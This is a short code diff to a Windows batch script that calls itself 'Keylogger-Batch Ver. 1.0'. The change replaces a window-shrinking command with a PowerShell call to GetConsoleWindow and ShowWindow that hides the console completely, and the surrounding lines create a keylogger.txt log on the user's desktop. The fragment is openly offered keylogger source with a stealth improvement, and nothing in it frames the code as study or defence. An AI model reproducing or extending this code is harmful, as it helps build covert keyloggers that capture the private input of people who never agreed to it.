@@ -3,7 +3,7 @@ cls
 title Keylogger-Batch Ver. 1.0
 
 :: Hide the terminal window
-powershell -Command "[Console]::WindowHeight=1; [Console]::WindowWidth=1; [Console]::BufferHeight=1; [Console]::BufferWidth=1"
+powershell -Command "Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\"User32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; $consolePtr = [Console.Window]::GetConsoleWindow(); [Console.Window]::ShowWindow($consolePtr, 0)"
 
 :: Create log file if it doesn't exist
 if not exist "%userprofile%\desktop\keylogger.txt" (
